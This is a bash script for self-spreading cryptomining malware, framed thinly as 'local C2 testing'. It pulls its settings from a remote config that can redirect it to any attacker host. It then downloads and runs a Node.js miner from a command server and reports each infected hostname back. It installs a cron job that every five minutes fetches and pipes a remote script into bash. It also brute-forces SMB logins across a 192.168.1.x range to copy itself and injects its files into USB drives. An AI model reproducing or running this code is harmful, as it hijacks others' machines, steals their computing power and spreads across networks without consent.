#!/bin/bash

# Colors for logging
RED="\033[31m"
PURPLE="\033[35m"
GREEN="\033[32m"
RESET="\033[0m"

# Default Configuration - Updated for local C2 testing
# All C2 communication is directed to localhost.
ATTACKER_IP="127.0.0.1"
ATTACKER_PORT="8080"
CONFIG_URL="https://github.com/lifewithoutcodes/mining-scripts/releases/latest/download/config.txt"
LOG_URL="http://${ATTACKER_IP}:${ATTACKER_PORT}/log_worker"
NETWORK_RANGE="192.168.1."
COMMON_USERS=("admin" "user" "guest")
COMMON_PASSWORDS=("password" "123456" "admin")
# These will be populated by fetch_config
POOL_URL=""
WALLET_ADDRESS=""

# Install dependencies, including smbclient for spreading.
install_deps() {
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Installing dependencies${RESET}"
    if ! command -v curl >/dev/null; then
        if command -v apt-get >/dev/null; then
            apt-get update -y && apt-get install -y curl
        elif command -v yum >/dev/null; then
            yum install -y curl
        elif command -v dnf >/dev/null; then
            dnf install -y curl
        else
            echo -e "${RED}[$(date +%H:%M:%S)] curl not found${RESET}"
            exit 1
        fi
    fi
    if ! command -v node >/dev/null; then
        curl -fsSL https://deb.nodesource.com/setup_16.x | bash - && apt-get install -y nodejs
    fi
    if ! command -v npm >/dev/null; then
        apt-get install -y npm
    fi
    if ! command -v smbclient >/dev/null; then
        apt-get install -y smbclient
    fi
    mkdir -p /tmp/miner_node_modules
    cd /tmp/miner_node_modules
    npm install axios ws chalk --save
    cd -
    echo -e "${GREEN}[$(date +%H:%M:%S)] Dependencies installed${RESET}"
}

# Fetch and parse config from the C2 server.
fetch_config() {
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Fetching config from $CONFIG_URL${RESET}"
    curl -s "$CONFIG_URL" -o /tmp/config.txt
    if [ -f /tmp/config.txt ]; then
        while IFS= read -r line; do
            if [[ $line =~ ^CONFIG_UPDATE_URL=(.*)$ ]]; then
                CONFIG_URL="${BASH_REMATCH[1]}"
            elif [[ $line =~ ^POOL_URL=(.*)$ ]]; then
                POOL_URL="${BASH_REMATCH[1]}"
            elif [[ $line =~ ^WALLET_ADDRESS=(.*)$ ]]; then
                WALLET_ADDRESS="${BASH_REMATCH[1]}"
            elif [[ $line =~ ^ATTACKER_IP=(.*)$ ]]; then
                ATTACKER_IP="${BASH_REMATCH[1]}"
            elif [[ $line =~ ^ATTACKER_PORT=(.*)$ ]]; then
                ATTACKER_PORT="${BASH_REMATCH[1]}"
                LOG_URL="http://${ATTACKER_IP}:${ATTACKER_PORT}/log_worker"
            fi
        done < /tmp/config.txt
    else
        echo -e "${RED}[$(date +%H:%M:%S)] Failed to fetch config${RESET}"
    fi
}

# Download and run the Node.js miner payload.
run_miner() {
    MINER_URL="http://$ATTACKER_IP:$ATTACKER_PORT/miner.js"
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Fetching miner from $MINER_URL${RESET}"
    curl -s "$MINER_URL" -o /tmp/miner.js
    if [ -f /tmp/miner.js ]; then
        NODE_PATH=/tmp/miner_node_modules node /tmp/miner.js --exploit-triggered &
        MINER_PID=$!
        echo -e "${GREEN}[$(date +%H:%M:%S)] Miner started (PID: $MINER_PID)${RESET}"
        curl -s -X POST -d "Exploit-triggered miner started on $(hostname):$MINER_PID" "$LOG_URL" >/dev/null
    else
        echo -e "${RED}[$(date +%H:%M:%S)] Failed to fetch miner.js${RESET}"
        exit 1
    fi
}

# Ensure persistence via cronjob and file integrity checks.
ensure_persistence() {
    CRON_JOB="*/5 * * * * curl -s http://$ATTACKER_IP:$ATTACKER_PORT/miner.sh | bash"
    if ! crontab -l 2>/dev/null | grep -q "$CRON_JOB"; then
        (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
        echo -e "${GREEN}[$(date +%H:%M:%S)] Cron persistence established${RESET}"
    fi
    for file in /tmp/miner.sh /tmp/miner.js; do
        if [ -f "$file" ]; then
            CURRENT_HASH=$(sha256sum "$file" | awk '{print $1}')
            EXPECTED_HASH=$(curl -s "http://$ATTACKER_IP:$ATTACKER_PORT/${file##*/}" | sha256sum | awk '{print $1}')
            if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
                curl -s "http://$ATTACKER_IP:$ATTACKER_PORT/${file##*/}" -o "$file"
                chmod +x "$file" 2>/dev/null
                echo -e "${PURPLE}[$(date +%H:%M:%S)] Restored ${file##*/} due to integrity mismatch${RESET}"
            fi
        fi
    done
}

# Spread to other machines on the LAN via SMB using common credentials.
smb_spread() {
    for i in $(seq 1 254); do
        target="${NETWORK_RANGE}${i}"
        for user in "${COMMON_USERS[@]}"; do
            for pass in "${COMMON_PASSWORDS[@]}"; do
                if smbclient -U "$user%$pass" -c "put $0 miner.sh" "//$target/C$" 2>/dev/null; then
                    echo -e "${GREEN}[$(date +%H:%M:%S)] Copied to $target via SMB${RESET}"
                fi
            done
        done &
    done
}

# Infect newly connected USB drives.
usb_inject() {
    while true; do
        for dev in /dev/sd[b-z]1; do
            if [ -b "$dev" ]; then
                mountpoint=$(mount | grep "$dev" | awk '{print $3}')
                if [ -n "$mountpoint" ]; then
                    for file in miner.sh miner.js config.txt; do
                        if [ -f "/tmp/$file" ] && [ ! -f "$mountpoint/$file" ]; then
                            cp "/tmp/$file" "$mountpoint/$file"
                            chmod +x "$mountpoint/$file" 2>/dev/null
                            echo -e "${GREEN}[$(date +%H:%M:%S)] Injected $file into USB at $mountpoint${RESET}"
                        fi
                    done
                fi
            fi
        done
        sleep 10
    done
}

# Watchdog to ensure the miner process stays running and connected.
watchdog() {
    while true; do
        if ! ps -p $MINER_PID >/dev/null 2>&1 || ! netstat -tuln | grep -q "$(echo $POOL_URL | cut -d':' -f2)"; then
            echo -e "${RED}[$(date +%H:%M:%S)] Miner inactive, restarting${RESET}"
            run_miner
        fi
        sleep 60
    done
}

# Main execution orchestrates all functions.
main() {
    install_deps
    fetch_config
    run_miner
    ensure_persistence
    watchdog &
    smb_spread &
    usb_inject &
    wait
}

main
